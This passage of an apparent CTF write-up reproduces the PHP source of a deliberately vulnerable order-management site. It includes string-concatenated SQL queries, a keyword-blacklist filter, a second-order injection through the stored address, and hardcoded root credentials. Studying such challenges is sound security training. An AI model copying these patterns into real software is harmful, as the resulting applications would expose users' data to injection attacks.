&gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt; </span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;    </span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;change.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class=\"line\">        $result &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">        if(!$result) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;修改收货地址&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;修改收货地址&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;修改订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;delete.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        $result &#x3D; $db-&gt;query(&#39;delete from &#96;user&#96; where &#96;user_id&#96;&#x3D;&#39; . $row[&quot;user_id&quot;]);</span><br><span class=\"line\">        if(!$result) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单删除成功&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;删除订单&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;删除订单&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;删除订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot; style&#x3D;&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;config.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$DATABASE &#x3D; array(</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;,</span><br><span class=\"line\">    &quot;username&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class=\"line\">    &quot;password&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class=\"line\">    &quot;dbname&quot; &#x3D;&gt;&quot;ctfusers&quot;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$db &#x3D; new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;confirm.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\">&#x2F;&#x2F;var_dump($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class=\"line\">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class=\"line\">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class=\"line\">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class=\"line\">        $re &#x3D; $re-&gt;execute();</span><br><span class=\"line\">        if(!$re) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span 